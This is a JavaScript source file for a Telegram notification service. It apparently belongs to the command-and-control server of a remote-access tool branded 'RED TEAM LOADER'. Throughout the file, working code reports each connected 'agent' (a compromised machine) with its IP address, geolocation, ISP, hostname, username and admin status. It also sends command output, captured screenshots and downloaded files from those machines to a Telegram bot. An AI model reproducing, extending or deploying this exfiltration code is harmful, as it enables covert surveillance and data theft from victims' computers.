const axios = require('axios');
const fs = require('fs').promises;
const path = require('path');
const FormData = require('form-data');
const geoLocationService = require('./geoLocationService');

class TelegramService {
  constructor() {
    this.config = {
      botToken: '',
      chatId: '',
      enabled: false,
      notifications: {
        newConnection: true,
        disconnection: true,
        taskCompletion: false,
        systemAlerts: true
      }
    };
    this.configPath = path.join(__dirname, '../config/telegram.json');
    this.loadConfig();
  }

  /**
   * Load Telegram configuration from file
   */
  async loadConfig() {
    try {
      const configData = await fs.readFile(this.configPath, 'utf8');
      this.config = { ...this.config, ...JSON.parse(configData) };
      console.log('Telegram configuration loaded');
    } catch (error) {
      console.log('No existing Telegram config found, using defaults');
      await this.saveConfig();
    }
  }

  /**
   * Save Telegram configuration to file
   */
  async saveConfig() {
    try {
      await fs.writeFile(this.configPath, JSON.stringify(this.config, null, 2));
      console.log('Telegram configuration saved');
    } catch (error) {
      console.error('Error saving Telegram config:', error);
    }
  }

  /**
   * Update Telegram configuration
   * @param {Object} newConfig - New configuration object
   */
  async updateConfig(newConfig) {
    this.config = { ...this.config, ...newConfig };
    await this.saveConfig();
  }

  /**
   * Test Telegram bot connection
   * @returns {Promise<boolean>} - Success status
   */
  async testBot() {
    if (!this.config.botToken) {
      throw new Error('Bot token not configured');
    }

    try {
      const response = await axios.get(`https://api.telegram.org/bot${this.config.botToken}/getMe`);
      
      if (response.data.ok) {
        // Send test message
        await this.sendMessage('🧪 **TEST MESSAGE**\n\n✅ Telegram bot is working correctly!\n\n🔴 **RED TEAM LOADER**\nBot configuration successful');
        return true;
      }
      return false;
    } catch (error) {
      console.error('Telegram bot test failed:', error.message);
      throw new Error('Bot test failed: ' + error.message);
    }
  }

  /**
   * Send message to Telegram
   * @param {string} message - Message to send
   * @param {Object} options - Additional options
   */
  async sendMessage(message, options = {}) {
    if (!this.config.enabled || !this.config.botToken || !this.config.chatId) {
      console.log('Telegram notifications disabled or not configured');
      return;
    }

    try {
      const payload = {
        chat_id: this.config.chatId,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
        ...options
      };

      const response = await axios.post(
        `https://api.telegram.org/bot${this.config.botToken}/sendMessage`,
        payload
      );

      if (response.data.ok) {
        console.log('Telegram message sent successfully');
        return response.data;
      } else {
        console.error('Telegram API error:', response.data);
      }
    } catch (error) {
      console.error('Error sending Telegram message:', error.message);
    }
  }

  /**
   * Send new client connection notification
   * @param {Object} client - Client object
   */
  async notifyNewConnection(client) {
    if (!this.config.notifications.newConnection) return;

    try {
      // Get enhanced geolocation info
      const geoInfo = await geoLocationService.getLocationInfo(client.ipAddress);
      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
      const location = geoLocationService.formatLocation(geoInfo);

      // Format system info
      const systemInfo = this.formatSystemInfo(client.systemInfo);
      const connectionTime = new Date().toLocaleString();
      
      const message = `🔴 **RED TEAM ALERT**

🔗 **New Agent Connected**
${flag} **Location:** \`${location}\`
📍 **IP Address:** \`${client.ipAddress}\`
🖥️ **Hostname:** \`${client.computerName || client.hostname || 'Unknown'}\`
🆔 **Agent ID:** \`${client.uuid}\`

💻 **System Details:**
${systemInfo}

🌐 **Network Info:**
• **ISP:** ${geoInfo.isp || 'Unknown'}
• **Organization:** ${geoInfo.organization || 'Unknown'}
• **Timezone:** ${geoInfo.timezone || client.systemInfo?.timeZone || 'Unknown'}
${geoInfo.zip && geoInfo.zip !== 'Unknown' ? `• **Postal Code:** ${geoInfo.zip}` : ''}

⏰ **Connected:** ${connectionTime}
🎯 **Status:** ONLINE ✅`;

      await this.sendMessage(message);
    } catch (error) {
      console.error('Error sending enhanced connection notification:', error);
      // Fallback to basic notification
      await this.sendBasicConnectionNotification(client);
    }
  }

  /**
   * Send client disconnection notification
   * @param {Object} client - Client object
   */
  async notifyDisconnection(client) {
    if (!this.config.notifications.disconnection) return;

    try {
      const geoInfo = client.geoLocation || await geoLocationService.getLocationInfo(client.ipAddress);
      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
      const location = geoLocationService.formatLocation(geoInfo);
      
      // Calculate session duration
      const sessionDuration = this.calculateSessionDuration(client);
      const disconnectionTime = new Date().toLocaleString();

      const message = `🔴 **RED TEAM ALERT**

❌ **Agent Disconnected**
${flag} **Location:** \`${location}\`
📍 **IP Address:** \`${client.ipAddress}\`
🖥️ **Hostname:** \`${client.computerName || client.hostname || 'Unknown'}\`
🆔 **Agent ID:** \`${client.uuid}\`

⏱️ **Session Duration:** ${sessionDuration}
⏰ **Disconnected:** ${disconnectionTime}
🎯 **Status:** OFFLINE ❌`;

      await this.sendMessage(message);
    } catch (error) {
      console.error('Error sending enhanced disconnection notification:', error);
      // Fallback to basic notification
      await this.sendBasicDisconnectionNotification(client);
    }
  }

  /**
   * Send task completion notification
   * @param {Object} task - Task object
   * @param {Object} client - Client object
   */
  async notifyTaskCompletion(task, client) {
    if (!this.config.notifications.taskCompletion) return;

    try {
      const geoInfo = client.geoLocation || await geoLocationService.getLocationInfo(client.ipAddress);
      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
      const location = geoLocationService.formatLocation(geoInfo);
      
      const completionTime = new Date().toLocaleString();
      const taskDuration = this.calculateTaskDuration(task);

      const message = `🔴 **RED TEAM ALERT**

✅ **Task Completed**
${flag} **Location:** \`${location}\`
📍 **IP Address:** \`${client.ipAddress}\`
🖥️ **Hostname:** \`${client.computerName || client.hostname || 'Unknown'}\`
🆔 **Agent ID:** \`${client.uuid}\`

📋 **Task:** \`${task.command || task.type || 'Unknown'}\`
⏱️ **Duration:** ${taskDuration}
⏰ **Completed:** ${completionTime}
📊 **Result:** ${task.status || 'Success'} ✅`;

      await this.sendMessage(message);
    } catch (error) {
      console.error('Error sending enhanced task completion notification:', error);
      // Fallback to basic notification
      await this.sendBasicTaskNotification(task, client);
    }
  }

  /**
   * Send system alert notification
   * @param {string} alertType - Type of alert
   * @param {string} message - Alert message
   * @param {Object} client - Client object (optional)
   */
  async notifySystemAlert(alertType, message, client = null) {
    if (!this.config.notifications.systemAlerts) return;

    try {
      let locationInfo = '';
      let clientInfo = '';
      
      if (client) {
        const geoInfo = client.geoLocation || await geoLocationService.getLocationInfo(client.ipAddress);
        const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
        const location = geoLocationService.formatLocation(geoInfo);
        
        locationInfo = `${flag} **Location:** \`${location}\`\n📍 **IP Address:** \`${client.ipAddress}\`\n`;
        clientInfo = `🖥️ **Hostname:** \`${client.computerName || client.hostname || 'Unknown'}\`\n🆔 **Agent ID:** \`${client.uuid}\`\n\n`;
      }

      const alertTime = new Date().toLocaleString();
      const alertEmoji = this.getAlertEmoji(alertType);

      const alertMessage = `🔴 **RED TEAM ALERT**

${alertEmoji} **System Alert: ${alertType}**
${locationInfo}${clientInfo}📢 **Message:** ${message}

⏰ **Alert Time:** ${alertTime}
🚨 **Priority:** HIGH`;

      await this.sendMessage(alertMessage);
    } catch (error) {
      console.error('Error sending enhanced system alert:', error);
      // Fallback to basic alert
      await this.sendBasicSystemAlert(alertType, message, client);
    }
  }

  /**
   * Send command output to Telegram
   * @param {Object} clientInfo - Client information
   * @param {string} command - Command executed
   * @param {string} output - Command output
   * @param {string} outputType - Type of output (text, screenshot, file, system-info)
   */
  async sendCommandOutput(clientInfo, command, output, outputType = 'text') {
    if (!this.isEnabled()) {
      console.log('Telegram notifications disabled or not configured');
      return;
    }

    try {
      const timestamp = new Date().toLocaleString();
      const geoInfo = clientInfo.geoLocation || await geoLocationService.getLocationInfo(clientInfo.ipAddress);
      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
      const location = geoLocationService.formatLocation(geoInfo);

      let message = `🔴 **RED TEAM ALERT**

📋 **Command Executed**
${flag} **Location:** \`${location}\`
📍 **IP Address:** \`${clientInfo.ipAddress}\`
🖥️ **Hostname:** \`${clientInfo.computerName || 'Unknown'}\`
🆔 **Agent ID:** \`${clientInfo.uuid}\`

💻 **Command:** \`${command}\`
📊 **Output Type:** ${outputType}
⏰ **Executed:** ${timestamp}

`;

      switch (outputType) {
        case 'screenshot':
          message += `📸 **Screenshot captured and attached**`;
          break;
        case 'file':
          message += `📁 **File downloaded and attached**`;
          break;
        case 'system-info':
          message += `ℹ️ **System Information:**\n\`\`\`\n${output}\n\`\`\``;
          break;
        case 'text':
        default:
          message += `📝 **Output:**\n\`\`\`\n${output}\n\`\`\``;
          break;
      }

      await this.sendMessage(message);
    } catch (error) {
      console.error('Error sending command output to Telegram:', error);
    }
  }

  /**
   * Send screenshot to Telegram
   * @param {Object} clientInfo - Client information
   * @param {Buffer} imageBuffer - Image buffer
   * @param {string} caption - Caption for the image
   */
  async sendScreenshot(clientInfo, imageBuffer, caption = '') {
    if (!this.isEnabled()) {
      console.log('Telegram notifications disabled or not configured');
      return;
    }

    try {
      const timestamp = new Date().toLocaleString();
      const geoInfo = clientInfo.geoLocation || await geoLocationService.getLocationInfo(clientInfo.ipAddress);
      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
      const location = geoLocationService.formatLocation(geoInfo);

      const message = `🔴 **RED TEAM ALERT**

📸 **Screenshot Captured**
${flag} **Location:** \`${location}\`
📍 **IP Address:** \`${clientInfo.ipAddress}\`
🖥️ **Hostname:** \`${clientInfo.computerName || 'Unknown'}\`
🆔 **Agent ID:** \`${clientInfo.uuid}\`

⏰ **Captured:** ${timestamp}
${caption ? `📝 **Note:** ${caption}` : ''}`;

      // Send photo with caption
      const formData = new FormData();
      formData.append('chat_id', this.config.chatId);
      formData.append('photo', imageBuffer, {
        filename: `screenshot_${clientInfo.uuid}_${Date.now()}.png`,
        contentType: 'image/png'
      });
      formData.append('caption', message);
      formData.append('parse_mode', 'Markdown');

      const response = await axios.post(
        `https://api.telegram.org/bot${this.config.botToken}/sendPhoto`,
        formData,
        {
          headers: {
            'Content-Type': 'multipart/form-data'
          }
        }
      );

      if (response.data.ok) {
        console.log('Screenshot sent to Telegram successfully');
        return response.data;
      } else {
        console.error('Telegram API error:', response.data);
      }
    } catch (error) {
      console.error('Error sending screenshot to Telegram:', error);
    }
  }

  /**
   * Send file to Telegram
   * @param {Object} clientInfo - Client information
   * @param {string} fileName - Name of the file
   * @param {Buffer} fileBuffer - File buffer
   * @param {string} caption - Caption for the file
   */
  async sendFile(clientInfo, fileName, fileBuffer, caption = '') {
    if (!this.isEnabled()) {
      console.log('Telegram notifications disabled or not configured');
      return;
    }

    try {
      const timestamp = new Date().toLocaleString();
      const geoInfo = clientInfo.geoLocation || await geoLocationService.getLocationInfo(clientInfo.ipAddress);
      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
      const location = geoLocationService.formatLocation(geoInfo);

      const message = `🔴 **RED TEAM ALERT**

📁 **File Downloaded**
${flag} **Location:** \`${location}\`
📍 **IP Address:** \`${clientInfo.ipAddress}\`
🖥️ **Hostname:** \`${clientInfo.computerName || 'Unknown'}\`
🆔 **Agent ID:** \`${clientInfo.uuid}\`

📄 **File:** \`${fileName}\`
⏰ **Downloaded:** ${timestamp}
${caption ? `📝 **Note:** ${caption}` : ''}`;

      // Send document with caption
      const formData = new FormData();
      formData.append('chat_id', this.config.chatId);
      formData.append('document', fileBuffer, {
        filename: fileName,
        contentType: 'application/octet-stream'
      });
      formData.append('caption', message);
      formData.append('parse_mode', 'Markdown');

      const response = await axios.post(
        `https://api.telegram.org/bot${this.config.botToken}/sendDocument`,
        formData,
        {
          headers: {
            'Content-Type': 'multipart/form-data'
          }
        }
      );

      if (response.data.ok) {
        console.log('File sent to Telegram successfully');
        return response.data;
      } else {
        console.error('Telegram API error:', response.data);
      }
    } catch (error) {
      console.error('Error sending file to Telegram:', error);
    }
  }

  /**
   * Send system information to Telegram
   * @param {Object} clientInfo - Client information
   * @param {Object} systemData - System information data
   */
  async sendSystemInfo(clientInfo, systemData) {
    if (!this.isEnabled()) {
      console.log('Telegram notifications disabled or not configured');
      return;
    }

    try {
      const timestamp = new Date().toLocaleString();
      const geoInfo = clientInfo.geoLocation || await geoLocationService.getLocationInfo(clientInfo.ipAddress);
      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
      const location = geoLocationService.formatLocation(geoInfo);

      const message = `🔴 **RED TEAM ALERT**

ℹ️ **System Information**
${flag} **Location:** \`${location}\`
📍 **IP Address:** \`${clientInfo.ipAddress}\`
🖥️ **Hostname:** \`${clientInfo.computerName || 'Unknown'}\`
🆔 **Agent ID:** \`${clientInfo.uuid}\`

⏰ **Collected:** ${timestamp}

${this.formatSystemInfo(systemData)}`;

      await this.sendMessage(message);
    } catch (error) {
      console.error('Error sending system info to Telegram:', error);
    }
  }

  /**
   * Get current configuration
   * @returns {Object} Current configuration
   */
  getConfig() {
    return { ...this.config };
  }

  /**
   * Check if notifications are enabled
   * @returns {boolean} Enabled status
   */
  isEnabled() {
    return this.config.enabled && this.config.botToken && this.config.chatId;
  }

  /**
   * Format system information for display
   * @param {Object} systemInfo - System information object
   * @returns {string} Formatted system info
   */
  formatSystemInfo(systemInfo) {
    if (!systemInfo) return '• **OS:** Unknown\n• **Architecture:** Unknown';

    const parts = [];
    
    // Operating System
    const osInfo = systemInfo.operatingSystem || 'Unknown';
    const osVersion = systemInfo.osVersion || '';
    const architecture = systemInfo.architecture || 'Unknown';
    parts.push(`• **OS:** ${osInfo} ${osVersion} (${architecture})`);

    // User and Admin Status
    if (systemInfo.username) {
      const adminStatus = systemInfo.isAdmin ? '👑 Admin' : '👤 User';
      parts.push(`• **User:** ${systemInfo.username} (${adminStatus})`);
    }

    // System Resources
    if (systemInfo.memory) {
      const totalGB = (systemInfo.memory.total / (1024**3)).toFixed(1);
      const availableGB = (systemInfo.memory.available / (1024**3)).toFixed(1);
      parts.push(`• **Memory:** ${availableGB}GB / ${totalGB}GB available`);
    }

    // CPU Information
    if (systemInfo.cpuInfo) {
      parts.push(`• **CPU:** ${systemInfo.cpuInfo.model || 'Unknown'} (${systemInfo.cpuInfo.cores || 'N/A'} cores)`);
    }

    // System Uptime
    if (systemInfo.uptime) {
      const uptimeHours = Math.floor(systemInfo.uptime / 3600);
      parts.push(`• **Uptime:** ${uptimeHours}h`);
    }

    // Local Time
    if (systemInfo.localTime) {
      const localTime = new Date(systemInfo.localTime).toLocaleString();
      parts.push(`• **Local Time:** ${localTime}`);
    }

    return parts.join('\n');
  }

  /**
   * Calculate session duration
   * @param {Object} client - Client object
   * @returns {string} Formatted duration
   */
  calculateSessionDuration(client) {
    if (!client.lastActiveTime && !client.createdAt) return 'Unknown';
    
    const startTime = client.createdAt || client.lastActiveTime;
    const endTime = new Date();
    const durationMs = endTime - new Date(startTime);
    
    const hours = Math.floor(durationMs / (1000 * 60 * 60));
    const minutes = Math.floor((durationMs % (1000 * 60 * 60)) / (1000 * 60));
    
    if (hours > 0) {
      return `${hours}h ${minutes}m`;
    } else {
      return `${minutes}m`;
    }
  }

  /**
   * Fallback basic connection notification
   * @param {Object} client - Client object
   */
  async sendBasicConnectionNotification(client) {
    const message = `🔴 **RED TEAM ALERT**

🔗 **New Agent Connected**
📍 **IP:** \`${client.ipAddress || 'Unknown'}\`
🖥️ **Hostname:** \`${client.computerName || client.hostname || 'Unknown'}\`
🆔 **Agent ID:** \`${client.uuid}\`

⏰ **Connected:** ${new Date().toLocaleString()}
🎯 **Status:** ONLINE ✅`;

    await this.sendMessage(message);
  }

  /**
    * Fallback basic disconnection notification
    * @param {Object} client - Client object
    */
   async sendBasicDisconnectionNotification(client) {
     const message = `🔴 **RED TEAM ALERT**

❌ **Agent Disconnected**
📍 **IP:** \`${client.ipAddress || 'Unknown'}\`
🖥️ **Hostname:** \`${client.computerName || client.hostname || 'Unknown'}\`
🆔 **Agent ID:** \`${client.uuid}\`

⏰ **Disconnected:** ${new Date().toLocaleString()}
🎯 **Status:** OFFLINE ❌`;

     await this.sendMessage(message);
   }

   /**
    * Fallback basic task notification
    * @param {Object} task - Task object
    * @param {Object} client - Client object
    */
   async sendBasicTaskNotification(task, client) {
     const message = `🔴 **RED TEAM ALERT**

✅ **Task Completed**
📍 **IP:** \`${client.ipAddress || 'Unknown'}\`
🖥️ **Hostname:** \`${client.computerName || client.hostname || 'Unknown'}\`
🆔 **Agent ID:** \`${client.uuid}\`

📋 **Task:** \`${task.command || task.type || 'Unknown'}\`
⏰ **Completed:** ${new Date().toLocaleString()}
📊 **Result:** ${task.status || 'Success'} ✅`;

     await this.sendMessage(message);
   }

   /**
    * Fallback basic system alert
    * @param {string} alertType - Type of alert
    * @param {string} message - Alert message
    * @param {Object} client - Client object (optional)
    */
   async sendBasicSystemAlert(alertType, message, client = null) {
     let clientInfo = '';
     if (client) {
       clientInfo = `
🖥️ **Hostname:** \`${client.computerName || client.hostname || 'Unknown'}\`
📍 **IP:** \`${client.ipAddress || 'Unknown'}\`
🆔 **Agent ID:** \`${client.uuid}\`
`;
     }

     const alertMessage = `🔴 **RED TEAM ALERT**

🚨 **System Alert: ${alertType}**${clientInfo}

📢 **Message:** ${message}
⏰ **Alert Time:** ${new Date().toLocaleString()}`;

     await this.sendMessage(alertMessage);
   }

   /**
    * Get appropriate emoji for alert type
    * @param {string} alertType - Type of alert
    * @returns {string} Emoji
    */
   getAlertEmoji(alertType) {
     const emojiMap = {
       'security': '🔒',
       'error': '❌',
       'warning': '⚠️',
       'info': 'ℹ️',
       'critical': '🚨',
       'network': '🌐',
       'system': '⚙️',
       'authentication': '🔐',
       'access': '🚪',
       'performance': '📊'
     };
     
     return emojiMap[alertType.toLowerCase()] || '🚨';
   }

   /**
    * Calculate task duration
    * @param {Object} task - Task object
    * @returns {string} Formatted duration
    */
   calculateTaskDuration(task) {
     if (!task.createdAt) return 'Unknown';
     
     const startTime = new Date(task.createdAt);
     const endTime = task.completedAt ? new Date(task.completedAt) : new Date();
     const durationMs = endTime - startTime;
     
     const seconds = Math.floor(durationMs / 1000);
     const minutes = Math.floor(seconds / 60);
     
     if (minutes > 0) {
       return `${minutes}m ${seconds % 60}s`;
     } else {
       return `${seconds}s`;
     }
   }
}

// Create singleton instance
const telegramService = new TelegramService();

module.exports = telegramService;